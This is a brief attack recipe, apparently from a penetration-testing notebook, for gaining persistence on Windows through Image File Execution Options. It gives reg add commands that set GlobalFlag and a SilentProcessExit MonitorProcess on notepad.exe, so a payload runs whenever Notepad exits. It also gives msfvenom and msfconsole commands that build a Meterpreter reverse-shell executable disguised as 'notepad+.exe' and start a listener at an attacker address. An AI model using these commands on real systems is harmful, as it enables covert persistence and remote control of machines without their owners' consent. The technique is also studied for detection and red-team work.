# Image File Execution Options (IFEO)

Image File Execution Options is a Windows registry key which enables developers to attach a debugger to an application and to enable “GlobalFlag” for application debugging. This behavior of Windows opens the door for persistence since an arbitrary executable can be used as a debugger of a specific process or as a “MonitorProcess“. In both scenarios code execution will achieved and the trigger will be either the creation of a process or the exit of an application

### GlobalFlag

The hexadecimal value 0x200 in the “GlobalFlag” registry key enables the silent exit monitoring for the notepad process

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
```

### MonitorProcess

payload execute when notepad exit

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "E:\Privilege-Escalation\notepad+.exe"
```

### The ReportingMode

registry key enables the Windows Error Reporting process (WerFault.exe) which will be the parent process of the “MonitorProcess” notepad+.exe.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
```

#### notepad+.exe (payload for persistent)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f exe > /var/www/html/notepad+.exe
```

#### listener

```bash
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```